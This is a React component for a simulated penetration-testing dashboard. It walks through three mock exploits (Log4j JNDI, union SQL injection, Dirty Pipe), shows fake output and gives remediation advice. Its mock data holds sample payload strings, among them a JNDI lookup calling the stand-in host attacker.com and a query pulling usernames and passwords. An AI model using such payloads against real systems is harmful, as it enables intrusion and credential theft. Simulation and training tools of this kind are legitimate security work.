"use client"

import { useState } from "react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Progress } from "@/components/ui/progress"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Textarea } from "@/components/ui/textarea"
import {
  Zap,
  Shield,
  AlertTriangle,
  Play,
  Terminal,
  Lock,
  Eye,
  EyeOff,
  CheckCircle,
  XCircle,
  Clock,
  Target,
} from "lucide-react"

interface ExploitAttempt {
  id: string
  vulnerability: string
  cve: string
  technique: string
  payload: string
  status: "pending" | "running" | "success" | "failed" | "blocked"
  success_probability: number
  impact_level: "low" | "medium" | "high" | "critical"
  timestamp: string
  output: string[]
  remediation: string
}

interface SimulationResult {
  access_gained: boolean
  privileges_escalated: boolean
  data_accessed: string[]
  persistence_established: boolean
  detection_probability: number
  cleanup_required: string[]
}

export function ExploitationSimulation({ target }: { target: string }) {
  const [isSimulating, setIsSimulating] = useState(false)
  const [currentExploit, setCurrentExploit] = useState<ExploitAttempt | null>(null)
  const [exploitHistory, setExploitHistory] = useState<ExploitAttempt[]>([])
  const [simulationResults, setSimulationResults] = useState<SimulationResult | null>(null)
  const [ethicalMode, setEthicalMode] = useState(true)
  const [showPayloads, setShowPayloads] = useState(false)

  const mockExploits: ExploitAttempt[] = [
    {
      id: "exp-001",
      vulnerability: "Apache Log4j2 RCE",
      cve: "CVE-2021-44228",
      technique: "JNDI Injection",
      payload: "${jndi:ldap://attacker.com/exploit}",
      status: "pending",
      success_probability: 85,
      impact_level: "critical",
      timestamp: new Date().toISOString(),
      output: [],
      remediation: "Upgrade Log4j to version 2.15.0 or later",
    },
    {
      id: "exp-002",
      vulnerability: "SQL Injection",
      cve: "CVE-2023-1234",
      technique: "Union-based SQLi",
      payload: "' UNION SELECT username,password FROM users--",
      status: "pending",
      success_probability: 70,
      impact_level: "high",
      timestamp: new Date().toISOString(),
      output: [],
      remediation: "Implement parameterized queries and input validation",
    },
    {
      id: "exp-003",
      vulnerability: "Privilege Escalation",
      cve: "CVE-2022-0847",
      technique: "Dirty Pipe",
      payload: "echo 'exploit_code' > /proc/self/mem",
      status: "pending",
      success_probability: 60,
      impact_level: "high",
      timestamp: new Date().toISOString(),
      output: [],
      remediation: "Update Linux kernel to patched version",
    },
  ]

  const startSimulation = async () => {
    if (!ethicalMode) {
      alert("Ethical mode must be enabled for simulation")
      return
    }

    setIsSimulating(true)
    setSimulationResults(null)

    for (const exploit of mockExploits) {
      setCurrentExploit({ ...exploit, status: "running" })

      // Simulate exploit execution
      const updatedExploit = { ...exploit }
      updatedExploit.status = "running"
      updatedExploit.output = ["[*] Initializing exploit...", "[*] Sending payload..."]

      await new Promise((resolve) => setTimeout(resolve, 2000))

      // Simulate random success/failure based on probability
      const success = Math.random() * 100 < exploit.success_probability

      if (success) {
        updatedExploit.status = "success"
        updatedExploit.output.push(
          "[+] Exploit successful!",
          "[+] Access gained to target system",
          "[+] Simulated impact: " + exploit.impact_level,
        )
      } else {
        updatedExploit.status = Math.random() > 0.5 ? "failed" : "blocked"
        updatedExploit.output.push(
          "[-] Exploit failed",
          "[-] Target may be patched or protected",
          "[!] No actual harm caused (simulation mode)",
        )
      }

      setExploitHistory((prev) => [...prev, updatedExploit])
      await new Promise((resolve) => setTimeout(resolve, 1000))
    }

    // Generate simulation results
    const successfulExploits = exploitHistory.filter((e) => e.status === "success")
    setSimulationResults({
      access_gained: successfulExploits.length > 0,
      privileges_escalated: successfulExploits.some((e) => e.impact_level === "critical"),
      data_accessed: ["user_credentials.db", "config_files", "application_logs"],
      persistence_established: false,
      detection_probability: 25,
      cleanup_required: ["Remove test payloads", "Clear simulation logs", "Reset target state"],
    })

    setIsSimulating(false)
    setCurrentExploit(null)
  }

  const getStatusColor = (status: string) => {
    switch (status) {
      case "success":
        return "text-green-500"
      case "failed":
        return "text-red-500"
      case "blocked":
        return "text-yellow-500"
      case "running":
        return "text-blue-500"
      default:
        return "text-muted-foreground"
    }
  }

  const getStatusIcon = (status: string) => {
    switch (status) {
      case "success":
        return <CheckCircle className="h-4 w-4 text-green-500" />
      case "failed":
        return <XCircle className="h-4 w-4 text-red-500" />
      case "blocked":
        return <Shield className="h-4 w-4 text-yellow-500" />
      case "running":
        return <Clock className="h-4 w-4 text-blue-500 animate-spin" />
      default:
        return <Clock className="h-4 w-4 text-muted-foreground" />
    }
  }

  return (
    <div className="space-y-6">
      {/* Ethical Warning */}
      <Alert className="border-destructive">
        <AlertTriangle className="h-4 w-4" />
        <AlertDescription>
          <strong>Ethical Simulation Mode:</strong> All exploits are simulated and no actual attacks are performed. This
          tool is for authorized security testing only. Ensure you have explicit permission before testing any target.
        </AlertDescription>
      </Alert>

      <Card>
        <CardHeader>
          <CardTitle className="flex items-center space-x-2">
            <Zap className="h-5 w-5" />
            <span>Exploitation Simulation</span>
            <Badge variant="outline">Phase 4</Badge>
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <div>
                <p className="text-sm text-muted-foreground">Target: {target}</p>
                <p className="text-sm text-muted-foreground">Mode: Ethical Simulation</p>
              </div>
              <div className="flex items-center space-x-2">
                <Lock className="h-4 w-4 text-green-500" />
                <span className="text-sm text-green-600">Ethical Mode Enabled</span>
              </div>
            </div>

            <div className="flex items-center space-x-2">
              <Button variant="outline" size="sm" onClick={() => setShowPayloads(!showPayloads)}>
                {showPayloads ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                {showPayloads ? "Hide" : "Show"} Payloads
              </Button>
              <Button
                onClick={startSimulation}
                disabled={isSimulating || !ethicalMode}
                className="flex items-center space-x-2"
              >
                <Play className="h-4 w-4" />
                <span>{isSimulating ? "Simulating..." : "Start Simulation"}</span>
              </Button>
            </div>
          </div>

          {currentExploit && (
            <div className="p-4 border rounded bg-muted/50">
              <div className="flex items-center space-x-2 mb-2">
                {getStatusIcon(currentExploit.status)}
                <span className="font-medium">Running: {currentExploit.vulnerability}</span>
                <Badge variant="outline">{currentExploit.cve}</Badge>
              </div>
              <Progress value={currentExploit.status === "running" ? 50 : 100} className="w-full" />
            </div>
          )}
        </CardContent>
      </Card>

      {exploitHistory.length > 0 && (
        <Tabs defaultValue="attempts" className="w-full">
          <TabsList className="grid w-full grid-cols-3">
            <TabsTrigger value="attempts">Exploit Attempts</TabsTrigger>
            <TabsTrigger value="results">Simulation Results</TabsTrigger>
            <TabsTrigger value="remediation">Remediation</TabsTrigger>
          </TabsList>

          <TabsContent value="attempts" className="space-y-4">
            {exploitHistory.map((exploit) => (
              <Card key={exploit.id}>
                <CardHeader>
                  <div className="flex items-center justify-between">
                    <div className="flex items-center space-x-3">
                      {getStatusIcon(exploit.status)}
                      <div>
                        <CardTitle className="text-lg">{exploit.vulnerability}</CardTitle>
                        <div className="flex items-center space-x-2 mt-1">
                          <Badge variant="outline" className="font-mono text-xs">
                            {exploit.cve}
                          </Badge>
                          <Badge variant="secondary">{exploit.technique}</Badge>
                          <Badge variant={exploit.impact_level === "critical" ? "destructive" : "outline"}>
                            {exploit.impact_level.toUpperCase()}
                          </Badge>
                        </div>
                      </div>
                    </div>
                    <div className="text-right">
                      <p className="text-sm font-medium">Success Rate</p>
                      <p className="text-lg font-bold text-primary">{exploit.success_probability}%</p>
                    </div>
                  </div>
                </CardHeader>
                <CardContent className="space-y-4">
                  {showPayloads && (
                    <div>
                      <h4 className="font-medium mb-2">Payload (Simulated)</h4>
                      <Textarea value={exploit.payload} readOnly className="font-mono text-xs bg-muted" rows={2} />
                    </div>
                  )}

                  <div>
                    <h4 className="font-medium mb-2">Execution Output</h4>
                    <div className="bg-black text-green-400 p-3 rounded font-mono text-xs space-y-1">
                      {exploit.output.map((line, index) => (
                        <div key={index}>{line}</div>
                      ))}
                    </div>
                  </div>

                  <div className="flex items-center justify-between">
                    <div className="flex items-center space-x-2">
                      <Terminal className="h-4 w-4 text-muted-foreground" />
                      <span className="text-sm">Status: </span>
                      <span className={`text-sm font-medium ${getStatusColor(exploit.status)}`}>
                        {exploit.status.toUpperCase()}
                      </span>
                    </div>
                    <div className="text-xs text-muted-foreground">{new Date(exploit.timestamp).toLocaleString()}</div>
                  </div>
                </CardContent>
              </Card>
            ))}
          </TabsContent>

          <TabsContent value="results" className="space-y-4">
            {simulationResults && (
              <div className="grid gap-4 md:grid-cols-2">
                <Card>
                  <CardHeader>
                    <CardTitle className="flex items-center space-x-2">
                      <Target className="h-5 w-5" />
                      <span>Attack Success</span>
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-3">
                    <div className="flex items-center justify-between">
                      <span>Initial Access</span>
                      {simulationResults.access_gained ? (
                        <CheckCircle className="h-4 w-4 text-green-500" />
                      ) : (
                        <XCircle className="h-4 w-4 text-red-500" />
                      )}
                    </div>
                    <div className="flex items-center justify-between">
                      <span>Privilege Escalation</span>
                      {simulationResults.privileges_escalated ? (
                        <CheckCircle className="h-4 w-4 text-green-500" />
                      ) : (
                        <XCircle className="h-4 w-4 text-red-500" />
                      )}
                    </div>
                    <div className="flex items-center justify-between">
                      <span>Persistence</span>
                      {simulationResults.persistence_established ? (
                        <CheckCircle className="h-4 w-4 text-green-500" />
                      ) : (
                        <XCircle className="h-4 w-4 text-red-500" />
                      )}
                    </div>
                  </CardContent>
                </Card>

                <Card>
                  <CardHeader>
                    <CardTitle className="flex items-center space-x-2">
                      <Shield className="h-5 w-5" />
                      <span>Impact Assessment</span>
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-3">
                    <div>
                      <p className="text-sm font-medium mb-1">Data Accessed (Simulated)</p>
                      <div className="space-y-1">
                        {simulationResults.data_accessed.map((data, index) => (
                          <Badge key={index} variant="outline" className="text-xs mr-1">
                            {data}
                          </Badge>
                        ))}
                      </div>
                    </div>
                    <div>
                      <p className="text-sm font-medium">Detection Probability</p>
                      <div className="flex items-center space-x-2">
                        <Progress value={simulationResults.detection_probability} className="flex-1" />
                        <span className="text-sm">{simulationResults.detection_probability}%</span>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              </div>
            )}
          </TabsContent>

          <TabsContent value="remediation" className="space-y-4">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center space-x-2">
                  <Shield className="h-5 w-5" />
                  <span>Remediation Steps</span>
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-4">
                  {exploitHistory.map((exploit, index) => (
                    <div key={index} className="p-3 border rounded">
                      <div className="flex items-center space-x-2 mb-2">
                        <Badge variant="outline">{exploit.cve}</Badge>
                        <span className="font-medium">{exploit.vulnerability}</span>
                      </div>
                      <p className="text-sm bg-muted p-2 rounded">{exploit.remediation}</p>
                    </div>
                  ))}

                  {simulationResults && (
                    <div className="mt-6">
                      <h4 className="font-medium mb-2">Cleanup Required</h4>
                      <div className="space-y-2">
                        {simulationResults.cleanup_required.map((item, index) => (
                          <div key={index} className="flex items-center space-x-2">
                            <CheckCircle className="h-4 w-4 text-green-500" />
                            <span className="text-sm">{item}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      )}
    </div>
  )
}
